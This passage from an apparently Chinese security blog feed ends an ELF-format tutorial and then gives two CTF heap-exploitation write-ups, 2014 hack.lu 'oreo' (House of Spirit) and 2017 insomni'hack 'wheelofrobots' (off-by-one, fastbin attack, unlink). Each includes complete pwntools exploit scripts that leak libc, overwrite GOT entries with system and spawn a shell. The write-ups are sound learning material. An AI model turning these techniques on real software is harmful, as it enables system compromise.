*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA        7<span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ    8<span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELAENT    9<span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ    10<span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT    11<span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT        12<span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI        13<span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SONAME    14<span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RPATH    15<span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMBOLIC    16<span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_REL        17<span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELSZ    18<span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELENT    19<span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTREL    20<span class="comment">/* Type of reloc in PLT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_DEBUG    21<span class="comment">/* For debugging; unspecified */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TEXTREL    22<span class="comment">/* Reloc might modify .text */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_JMPREL    23<span class="comment">/* Address of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_BIND_NOW24<span class="comment">/* Process relocations of object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAY25<span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAYSZ27<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RUNPATH    29<span class="comment">/* Library search path */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FLAGS    30<span class="comment">/* Flags for the object being loaded */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ENCODING    32<span class="comment">/* Start of encoded range */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PREINIT_ARRAY 32        <span class="comment">/* Array with addresses of preinit fct*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PREINIT_ARRAYSZ 33        <span class="comment">/* size in bytes of DT_PREINIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB_SHNDX    34<span class="comment">/* Address of SYMTAB_SHNDX section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_NUM35<span class="comment">/* Number used */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_LOOS        0x6000000d<span class="comment">/* Start of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HIOS        0x6ffff000<span class="comment">/* End of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_LOPROC    0x70000000<span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HIPROC    0x7fffffff<span class="comment">/* End of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_PROCNUMDT_MIPS_NUM<span class="comment">/* Most used by any processor */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRRNGLO    0x6ffffe00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_HASH    0x6ffffef5<span class="comment">/* GNU-style hash table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TLSDESC_PLT    0x6ffffef6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TLSDESC_GOT    0x6ffffef7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_CONFLICT    0x6ffffef8<span class="comment">/* Start of conflict section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_GNU_LIBLIST    0x6ffffef9<span class="comment">/* Library list */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_CONFIG    0x6ffffefa<span class="comment">/* Configuration information.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_DEPAUDIT    0x6ffffefb<span class="comment">/* Dependency auditing.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_AUDIT    0x6ffffefc<span class="comment">/* Object auditing.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_PLTPAD0x6ffffefd<span class="comment">/* PLT padding.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_MOVETAB0x6ffffefe<span class="comment">/* Move table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMINFO    0x6ffffeff<span class="comment">/* Syminfo table.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRRNGHI    0x6ffffeff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRTAGIDX(tag)    (DT_ADDRRNGHI - (tag))<span class="comment">/* Reverse order! */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ADDRNUM 11</span></span><br></pre></td></tr></table></figure><ul><li><p>字符串表地址d_tag&#x3D;5的地址，后面八位就是地址，其实section里的.dynstr也能找到，但是不一定准确，因为我们程序加载执行时那个setion无用</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318230730833.png" alt="image-20230318230730833"></p><p><img src="/2023/03/19/23-2-21-elf/image-20230817101327570.png" alt="image-20230817101327570"></p></li><li><p>导入库表d_tag&#x3D;1 后面时字符串表的偏移，可能不止一个导入库表</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318231041729.png" alt="image-20230318231041729"></p><p>0x1040+0x0542&#x3D;0x1582 0x1040+0x0552&#x3D;0x1592</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318231247771.png" alt="image-20230318231247771"></p></li><li><p>符号表 d_tag&#x3D;6 对应section .dynsym</p><p><img src="/2023/03/19/23-2-21-elf/image-20230318232353517.png" alt="image-20230318232353517"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;<span class="number">4</span><span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="number">1</span><span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;    <span class="number">1</span><span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section    st_shndx;<span class="number">2</span><span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr    st_value;<span class="number">8</span><span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword    st_size;<span class="number">8</span><span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;                <span class="number">24</span></span><br></pre></td></tr></table></figure></li><li><p>导入表 d_tag&#x3D;23&#x3D;0x17</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319004444739.png" alt="image-20230319004444739"></p><p>导入表的size在d_tag&#x3D;2处</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319004959046.png" alt="image-20230319004959046"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr    r_offset;<span class="number">8</span><span class="comment">/* Address */</span>，写入导入地址，也就是got表</span><br><span class="line">  Elf64_Xword    r_info;<span class="number">8</span><span class="comment">/* Relocation type and symbol index */</span>前<span class="number">32</span>位存储着重定位类型信息，后<span class="number">32</span>位存储着符号表索引从<span class="number">1</span>开始</span><br><span class="line">  Elf64_Sxword    r_addend;<span class="number">8</span><span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>选取一个分析</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014528225.png" alt="image-20230319014528225"></p><p>符号表</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014737236.png" alt="image-20230319014737236"></p><p>字符串表0x1040+0x344&#x3D;1384</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319014926764.png" alt="image-20230319014926764"></p><p>ida</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319015029874.png" alt="image-20230319015029874"></p></li><li><p>重定位表 d_tag&#x3D;7 size在d_tag&#x3D;8</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319123925728.png" alt="image-20230319123925728"></p><p>结构和导入表一样</p></li><li><p>哈希表 #define DT_GNU_HASH0x6ffffef5&#x2F;* GNU-style hash table.  *&#x2F;</p><p><img src="/2023/03/19/23-2-21-elf/image-20230319134353748.png" alt="image-20230319134353748"></p><p>用于加速符号查找，在 DT_GNU_HASH 中，符号名称被哈希到一个桶中，每个桶中保存了一个指向符号表的指针。当需要查找符号时，动态链接器可以使用哈希表来快速定位符号的位置，而不需要遍历整个符号表。</p></li></ul></li><li><p>Read-only After Relocation</p><p>加载到内存重定位后最后一个segment还会指导进行只读改写<img src="/2023/03/19/23-2-21-elf/image-20230223005339928.png" alt="image-20230223005339928"></p></li></ul><p>​从0x232b0开始memsz 3208个byte为只读</p><h2 id="Section-Header-Table"><a href="#Section-Header-Table" class="headerlink" title="Section Header Table"></a>Section Header Table</h2><ul><li>节头表（Section header table）<ul><li>记录了ELF文件的节区信息</li><li>用于链接的目标文件必须拥有此结构</li><li>其它类型目标文件不一定需要</li></ul></li></ul><p>section Header Table内容对程序执行完全不影响，可以完全改掉，正常执行(这个也和动态linker版本有关)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word  sh_name;        <span class="comment">// 节名称在 .shstrtab 节中的索引</span></span><br><span class="line">    Elf32_Word  sh_type;        <span class="comment">// 节类型</span></span><br><span class="line">    Elf32_Word  sh_flags;       <span class="comment">// 节标志</span></span><br><span class="line">    Elf32_Addr  sh_addr;        <span class="comment">// 节的内存地址</span></span><br><span class="line">    Elf32_Off   sh_offset;      <span class="comment">// 节在文件中的偏移量</span></span><br><span class="line">    Elf32_Word  sh_size;        <span class="comment">// 节的大小（字节数）</span></span><br><span class="line">    Elf32_Word  sh_link;        <span class="comment">// 链接到的其他节的索引</span></span><br><span class="line">    Elf32_Word  sh_info;        <span class="comment">// 额外信息</span></span><br><span class="line">    Elf32_Word  sh_addralign;   <span class="comment">// 对齐方式</span></span><br><span class="line">    Elf32_Word  sh_entsize;     <span class="comment">// 节包含实体的大小</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/19/23-2-21-elf/image-20230222232634953.png" alt="image-20230222232634953"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Spirit 2014 hack.lu oreo</title>
      <link href="/2023/03/17/2014-hack-lu-oreo/"/>
      <url>/2023/03/17/2014-hack-lu-oreo/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec oreo</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/oreo&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo</a></p><h2 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h2><p>add函数里存在溢出漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 rifle           struc ; (sizeof=0x38, mappedto_5)</span><br><span class="line">00000000 descript        db 25 dup(?)</span><br><span class="line">00000019 name            db 27 dup(?)</span><br><span class="line">00000034 next            dd ?                    ; offset</span><br><span class="line">00000038 rifle           ends</span><br></pre></td></tr></table></figure><p>往name和的script里面都是读了56个字节，都可以溢出</p><p>覆盖next为putsgot在show函数里可以在第二次打印时泄露</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048774                 mov     eax, [ebp+var_14]</span><br><span class="line">.text:08048777                 mov     [esp+4], eax</span><br><span class="line">.text:0804877B                 mov     dword ptr [esp], offset aDescriptionS ; &quot;Description: %s\n&quot;</span><br><span class="line">.text:08048782                 call    _printf</span><br></pre></td></tr></table></figure><p>这里直接把eax里内容next地址放到eax，可以%s解析got打印出来</p><p>puts_got&#x3D;elf.got[‘puts’]<br>payload1 &#x3D; b’a’*27+p32(puts_got)<br>add(b’a’*25,payload1)<br>show_rifle()</p><h3 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h3><p>这里需要绕过一些检测</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><p>这里我们可以控制next，可以free(next),可以修改notice，而且notice指针上面就可以控制size大小，天生的伪造，再申请控制0804A2A8</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bss:0804A2A4 rifle_cnt       dd ?                    ; DATA XREF: add+C5↑r</span><br><span class="line">.bss:0804A2A4                                         ; add+CD↑w ...</span><br><span class="line">.bss:0804A2A8 ; char *notice</span><br><span class="line">.bss:0804A2A8 notice          dd ?                    ; DATA XREF: message+23↑r</span><br><span class="line">.bss:0804A2A8                                         ; message+3C↑r ...</span><br></pre></td></tr></table></figure><p>我们申请只能在add函数里面malloc(0x38),也就是说size必须控制为0x38+0x8来申请，这样我们申请0x40个chunk，再控制最后一个next指针指向0804A2A8，这个伪造chunk next域必须为空，防止free chunk-&gt;next，这里是往0804A2A8里面的地址0804A2c0去写数据</p><p><img src="/2023/03/17/2014-hack-lu-oreo/image-20230318005107301.png" alt="image-20230318005107301"></p><p>，padding0x20，即可满足到底下一个fake chunk，将其prev size和size改为满足条件即可</p><p>再集体free掉，fastbin先进先出，再次申请一个就可以拿到0804A2A0处的chunk，改写__isoc99_sscanfgot即可</p><p><img src="/2023/03/17/2014-hack-lu-oreo/image-20230317234423315.png" alt="image-20230317234423315"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./oreo&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">descrip, name</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.sendline(descrip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_rifle</span>():</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;===================================\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">notice</span>):</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendline(notice)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x08048748&#x27;)</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(puts_got)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>,payload1)</span><br><span class="line">show_rifle()</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_ad=u32(r(<span class="number">4</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3e</span>):</span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>*<span class="number">25</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">27</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x0804a2a8</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>,payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x41</span>)+p32(<span class="number">0x50</span>)</span><br><span class="line">message(payload3)</span><br><span class="line">order()</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">sscanf_got = elf.got[<span class="string">&#x27;__isoc99_sscanf&#x27;</span>]</span><br><span class="line">add(p32(sscanf_got),<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">message(p32(system_addr))</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Spirit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 insomni&#39;hack wheelofrobots</title>
      <link href="/2023/03/16/2017-insomn-hack-wheelofrobots/"/>
      <url>/2023/03/16/2017-insomn-hack-wheelofrobots/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni'hack_wheelofrobots">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni&#39;hack_wheelofrobots</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec wheelofrobots</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/wheelofrobots&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>robots指针地址</p><p>0x6030e0- robot 4<br>0x6030e8- robot 6<br>0x6030f0- robot 2<br>0x6030f8- robot 1<br>0x603100- robot 3<br>0x603108- robot 5</p><p>大小</p><p>0x603138- robot 2<br>0x603140- robot 3<br>0x603148- robot 6</p><p>程序add()里num &#x3D; read_num((char *)&amp;choice, 5uLL);存在off by one漏洞，会覆盖掉robots 2的inuse位，一切的一切都从这里开始</p><h3 id="fastbin-attach任意长度堆溢出"><a href="#fastbin-attach任意长度堆溢出" class="headerlink" title="fastbin attach任意长度堆溢出"></a>fastbin attach任意长度堆溢出</h3><p>我们申请到robots2，大小控制到fastbin，0x20把，然后free掉这个chunk</p><p>这个时候fast bin0x20出现这个chunk指针，我们可以通过offbyone，重新使用这个堆，这个时候往这个chunk里面写入值，robots2+0x10已经不是原来的user data，而是fd指针，我们把他改为一个伪造的free chunk地址，申请0x20堆块的第二次，就可以申请到这个伪造chunk，那就可以实现地址读写，但是要绕过，fastbin 的size&#x3D;0x21检测，伪造的free chunk+0x8需要&#x3D;0x21，我们观察程序选择到0x603138，因为robots3，size是可控为0x21的，</p><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230316234451675.png" alt="image-20230316234451675"></p><p>我们拿到0x603138这个chunk后，会往0x603138+0x10&#x3D;0x603148,即robot 6的size写入值，就可以实现任意大小堆溢出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x80</span>))</span><br></pre></td></tr></table></figure><h3 id="构造unlink"><a href="#构造unlink" class="headerlink" title="构造unlink"></a>构造unlink</h3><p>常规构造,不多bb</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = <span class="number">0x6030E8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x30</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>0x6030E8，地址写入0x6030D0</p><h3 id="老办法"><a href="#老办法" class="headerlink" title="老办法"></a>老办法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+ p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317002742295.png" alt="image-20230317002742295"></p><p>2 6 1可用  puts free atoi</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">change(<span class="number">6</span>,p64(puts_plt))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">change(<span class="number">1</span>,p64(system))</span><br><span class="line">sla(<span class="string">b&#x27;oice : &#x27;</span>,<span class="string">b&#x27;sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="新办法"><a href="#新办法" class="headerlink" title="新办法"></a>新办法</h3><p>我们先</p><p>payload &#x3D; p64(0)*2 + b’a’*0x18 + p64(0x6030e8)<br>change(6,payload)</p><p>把1的指针指向6，这样就可以写一个通用函数去修改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def write(where, what):</span><br><span class="line">    change(1, p64(where))</span><br><span class="line">    change(6, p64(what))</span><br></pre></td></tr></table></figure><p>我们去利用start_robot打印出地址，由于打印结束后会exit，我们需要先hook掉这个exitgot，改为leave ret或ret即可</p><p><img src="/2023/03/16/2017-insomn-hack-wheelofrobots/image-20230317005523642.png" alt="image-20230317005523642"></p><p>然后去修改got即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6030e8</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">leaveret=<span class="number">0x40172a</span></span><br><span class="line">ret=<span class="number">0x40172b</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], leaveret)</span><br><span class="line">change(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;choice : &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;great!! Thx &#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">write(elf.got[<span class="string">&#x27;free&#x27;</span>], system)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="built_in">bin</span>))</span><br><span class="line">remove(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><p><img 